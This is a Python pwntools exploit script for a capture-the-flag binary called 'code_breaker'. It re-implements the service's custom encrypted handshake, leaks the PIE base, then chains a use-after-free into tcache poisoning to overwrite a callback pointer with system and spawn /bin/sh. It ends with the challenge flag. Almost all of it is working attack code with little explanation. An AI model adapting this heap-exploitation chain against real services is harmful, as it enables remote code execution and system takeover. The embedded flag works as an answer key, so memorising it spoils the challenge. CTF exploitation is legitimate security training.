#!/usr/bin/env python3
from pwn import *
import os

PORT = 26005
HOST = "chal.sunshinectf.games"

elf = context.binary = ELF("./code_breaker_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return elf.process()

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001CC1
            brva 0x0000000000001C45
            brva 0x0000000000001B19
            brva 0x0000000000001E12
            c
            set follow-fork-mode parent
            ''')

SBOX_raw = [
  0xB7, 0x82, 0xBF, 0xE0, 0x03, 0xB6, 0xE9, 0x93, 0x10, 0x61, 
  0x25, 0xDC, 0xEA, 0xA4, 0x34, 0xD2, 0x1C, 0x7A, 0xE5, 0x22, 
  0xCB, 0x68, 0x91, 0xDA, 0xEE, 0x97, 0xD8, 0x6A, 0xEB, 0x1D, 
  0x70, 0xF9, 0x18, 0xAA, 0xF6, 0xB1, 0xB2, 0x71, 0xBB, 0xA6, 
  0xC8, 0x4B, 0x99, 0x28, 0xD4, 0xF1, 0x42, 0xA9, 0xB9, 0xE1, 
  0x05, 0x63, 0x48, 0xA5, 0x72, 0xAE, 0xEF, 0x8B, 0xAF, 0x04, 
  0x81, 0x60, 0x12, 0xD7, 0x6D, 0x07, 0x0A, 0x17, 0x5D, 0xF8, 
  0x47, 0xB5, 0xE4, 0x3F, 0x86, 0xF3, 0xCA, 0x6C, 0x2F, 0x45, 
  0xB3, 0x6F, 0x8E, 0x94, 0x9A, 0xB0, 0xEC, 0x08, 0xD1, 0xAC, 
  0x66, 0x37, 0xA2, 0x50, 0x38, 0x4C, 0x6B, 0x74, 0x29, 0x78, 
  0x5C, 0x4D, 0xBC, 0xA3, 0xFF, 0x77, 0xE7, 0x39, 0x85, 0x67, 
  0xF2, 0x89, 0x1F, 0x96, 0xAB, 0xA1, 0x26, 0x3B, 0x46, 0xE8, 
  0x0F, 0xD6, 0x15, 0x23, 0x9D, 0x3D, 0xE6, 0x21, 0x06, 0x1A, 
  0xCD, 0x7D, 0xC1, 0x98, 0x7B, 0x1B, 0xC0, 0xA8, 0x59, 0x2E, 
  0xA7, 0x54, 0x7E, 0x2A, 0xDF, 0xC4, 0x19, 0x30, 0x69, 0x87, 
  0x2B, 0xED, 0xF4, 0xF0, 0x24, 0xFB, 0x4E, 0xD5, 0x0B, 0x55, 
  0xE3, 0x27, 0x11, 0xBD, 0x0D, 0x4F, 0x56, 0xBA, 0x62, 0x01, 
  0xFC, 0x64, 0x9E, 0x31, 0x33, 0xAD, 0x20, 0x7F, 0xCF, 0x9F, 
  0x02, 0x41, 0x9B, 0x36, 0xBE, 0x8C, 0x80, 0x35, 0xD0, 0x13, 
  0xFA, 0x09, 0x7C, 0x52, 0xD3, 0x5A, 0x92, 0x00, 0x75, 0xC9, 
  0x58, 0x40, 0xF7, 0x44, 0x8F, 0xE2, 0x3E, 0xFD, 0xA0, 0xC5, 
  0x57, 0x95, 0x14, 0x8D, 0x65, 0x73, 0x79, 0x9C, 0xDB, 0xD9, 
  0xCE, 0x5E, 0x51, 0xB4, 0xCC, 0xDE, 0x8A, 0xF5, 0x32, 0x3A, 
  0x1E, 0x0C, 0x5F, 0xFE, 0xC7, 0x4A, 0xDD, 0x2C, 0x0E, 0x2D, 
  0x83, 0x49, 0x53, 0xC6, 0x84, 0x6E, 0x88, 0x3C, 0x5B, 0x16, 
  0xB8, 0x76, 0xC3, 0x43, 0x90, 0xC2
]

SBOX = bytes(SBOX_raw)

def derive_key(server_nonce, client_nonce, out_addr_low=0x42D0):
    stack = bytearray(server_nonce + client_nonce)
    key = bytearray(16)
    esi = (-out_addr_low) & 0xFFFFFFFF
    r9_off = 0
    rounds = 0

    while rounds != 0x0C:
        for i in range(16):
            idx = (esi + out_addr_low + i) & 0x1F
            x = stack[idx] ^ key[i]
            x = SBOX[x]
            x ^= stack[r9_off + i]
            key[i] = rol(x, 3, 8)

        rounds += 3
        r9_off += 3
        esi = (esi + 8) & 0xFFFFFFFF

    return bytes(key)


def crypt(data, key, state):
    out = bytearray(data)

    for i in range(len(out)):
        out[i] ^= SBOX[(state + i + key[i & 0xF]) & 0xFF]

    return bytes(out), (state + len(out)) & 0xFFFFFFFF


def proof_for_key(key):
    return bytes(SBOX[key[i]] ^ key[(i + 5) & 0xF] for i in range(16))


class CodeBreaker:
    def __init__(self, p):
        self.p = p
        self.key = None
        self.tx = 0
        self.rx = 0

    def send_plain_frame(self, data):
        assert len(data) <= 0x1000
        self.p.send(p16(len(data), endian="big") + data)

    def recv_plain_frame(self):
        n = u16(self.p.recvn(2), endian="big")
        return self.p.recvn(n)

    def send_encrypted_frame(self, data):
        enc, self.tx = crypt(data, self.key, self.tx)
        self.send_plain_frame(enc)

    def recv_encrypted_frame(self):
        enc = self.recv_plain_frame()
        dec, self.rx = crypt(enc, self.key, self.rx)
        return dec

    def handshake(self):
        frame = self.recv_plain_frame()
        assert len(frame) == 17 and frame[0] == 0x01, frame.hex()

        server_nonce = frame[1:]
        client_nonce = os.urandom(16)
        self.send_plain_frame(b"\x02" + client_nonce)

        self.key = derive_key(server_nonce, client_nonce)
        self.send_encrypted_frame(b"\x03" + proof_for_key(self.key))

        resp = self.recv_encrypted_frame()
        assert resp == b"\x04\x00", resp.hex()

    def request(self, payload):
        self.send_encrypted_frame(payload)
        return self.recv_encrypted_frame()

    def add(self, idx, size, data):
        assert len(data) == size
        return self.request(bytes([0x10, idx]) + p16(size, endian="big") + data)

    def show(self, idx):
        resp = self.request(bytes([0x11, idx]))
        assert len(resp) >= 4 and resp[:2] == b"\x11\x00", resp.hex()

        size = u16(resp[2:4], endian="big")
        return resp[4 : 4 + size]

    def edit(self, idx, data):
        return self.request(bytes([0x12, idx]) + p16(len(data), endian="big") + data)

    def delete(self, idx):
        return self.request(bytes([0x13, idx]))

    def clone(self, dst, src):
        return self.request(bytes([0x14, dst, src]))

    def call(self, cmd):
        self.send_encrypted_frame(b"\x15" + cmd)

    def info(self):
        return self.request(b"\x16")


p = start()
cb = CodeBreaker(p)

cb.handshake()

# Leak PIE

leak = cb.info()
callback = u64(leak[2:10])
PIE = callback - 0x1390

for chunk in range(2, len(leak), 8):
    log.info(f'chunk {hex(chunk-2)} - {hex(chunk+8-2)}: {hex(u64(leak[chunk:chunk+8]))}')

log.info(f"callback: {hex(callback)}")
log.info(f"PIE_base: {hex(PIE)}")

# UAF -> Tcache Poison -> overwrite callback->system

cb.add(0, 0x80, b'A'*0x80)
# GDB()
cb.add(1, 0x80, b'B'*0x80)
cb.clone(2, 0)
# GDB()
cb.delete(2)

leak = cb.show(0)
heap = u64(leak[:8])

cb.clone(3, 1)
cb.delete(3)

callback_slot = PIE + 0x40c0
fd = callback_slot ^ heap
cb.edit(1, p64(fd) + b'C'*(0x80-8))

system = PIE + 0x1150
cb.add(4, 0x80, b'D'*0x80)
cb.add(5, 0x80, p64(system) + b'D'*(0x80-8))

cb.call(b'/bin/sh\0')

p.interactive()

# sun{cr4ck_tHe_ciPh3r_fr33_thE_heaP}